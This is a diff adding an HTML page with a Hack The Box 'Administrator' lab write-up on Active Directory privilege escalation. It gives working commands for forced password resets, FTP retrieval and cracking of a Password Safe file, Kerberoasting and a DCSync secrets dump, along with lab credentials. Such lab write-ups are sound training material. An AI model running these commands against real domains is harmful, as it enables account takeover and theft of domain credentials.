@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Administrator | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB Administrator</h1>
+      <p class="headline">Password reset chain, Password Safe recovery, Kerberoasting and DCSync</p>
+      <p class="meta">Medium - Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Administrator starts with valid credentials for <code>Olivia</code>. BloodHound reveals a chain of password reset rights that pivots through <code>michael</code> and <code>benjamin</code>. FTP access as <code>benjamin</code> exposes a Password Safe database, which is cracked to recover additional credentials. The path continues through <code>emily</code>, Kerberoasting of <code>ethan</code>, and finally DCSync to extract Administrator secrets.</p>
+<h2>Initial Access and BloodHound Path</h2>
+<p>The initial credentials were provided:</p>
+<pre><code class="language-text">User: Olivia
+Password: ichliebedich</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112220209.png" alt="Initial port scan" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112220427.png" alt="Service enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112220556.png" alt="Provided credentials" /></figure>
+<p>WinRM access as <code>olivia</code> was validated.</p>
+<pre><code class="language-bash">evil-winrm -i 10.129.172.54 -u olivia -p ichliebedich</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112230333.png" alt="WinRM validation as olivia" /></figure>
+<p>BloodHound data showed a password reset chain starting from Olivia.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112230917.png" alt="BloodHound collection" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112231512.png" alt="BloodHound import" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241112232453.png" alt="Shortest path to Michael" /></figure>
+<h2>Password Reset Chain</h2>
+<p>Olivia could force-reset Michael&#39;s password.</p>
+<pre><code class="language-bash">net rpc password &quot;michael&quot; &quot;Password@123&quot; -U &quot;administrator.htb&quot;/&quot;olivia&quot;%&quot;ichliebedich&quot; -S &quot;administrator.htb&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113000215.png" alt="Password reset for michael" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113000410.png" alt="Michael credentials validation" /></figure>
+<p>Michael could then reset Benjamin&#39;s password.</p>
+<pre><code class="language-bash">net rpc password &quot;benjamin&quot; &quot;Password@1234&quot; -U &quot;administrator.htb&quot;/&quot;michael&quot;%&quot;Password@123&quot; -S &quot;administrator.htb&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113001025.png" alt="Password reset for benjamin" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113000954.png" alt="Benjamin credentials validation" /></figure>
+<h2>Password Safe Recovery</h2>
+<p>Benjamin had FTP access and could download <code>Backup.psafe3</code>.</p>
+<pre><code class="language-bash">netexec ftp 10.129.172.54 -u benjamin -p Password@1234 --ls
+netexec ftp 10.129.172.54 -u benjamin -p Password@1234 --get &quot;Backup.psafe3&quot;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113001257.png" alt="FTP listing exposes Backup" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113001527.png" alt="Backup.psafe3 download" /></figure>
+<p>The Password Safe file was converted and cracked with John.</p>
+<pre><code class="language-bash">pwsafe2john Backup.psafe3 &gt; hashBackupPsafe3
+john --wordlist=/usr/share/wordlists/rockyou.txt hashBackupPsafe3</code></pre>
+<pre><code class="language-text">Password: tekieromucho</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113003034.png" alt="pwsafe2john conversion" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113003135.png" alt="Password Safe password cracked" /></figure>
+<p>The database contained credentials for multiple users. <code>emily</code> was valid on the target.</p>
+<pre><code class="language-text">alexander: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+emily: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+emma: WwANQWnmJnGV07WQN8bMS7FMAbjNur</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113003327.png" alt="Password Safe entries" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113004655.png" alt="Emily credentials validation" /></figure>
+<h2>Kerberoasting and DCSync</h2>
+<p>Further enumeration led to <code>ethan</code>. Kerberoasting produced material that was cracked with Hashcat.</p>
+<pre><code class="language-text">User: ethan
+Password: limpbizkit</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113004918.png" alt="Kerberoasting path" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113005843.png" alt="Hashcat cracking" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113005901.png" alt="Ethan password recovered" /></figure>
+<p>With Ethan&#39;s privileges, domain secrets were dumped.</p>
+<pre><code class="language-bash">impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.172.54</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113010320.png" alt="DCSync with ethan" /></figure>
+<p>The Administrator hash enabled privileged login.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/administrator/Pasted%20image%2020241113010605.png" alt="Administrator login" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>BloodHound password reset edges can create multi-user escalation chains.</li>
+<li>Password vault files are high-value targets when found on network services.</li>
+<li>Kerberoasting remains useful even late in an attack chain.</li>
+<li>DCSync rights immediately convert domain privileges into full credential compromise.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
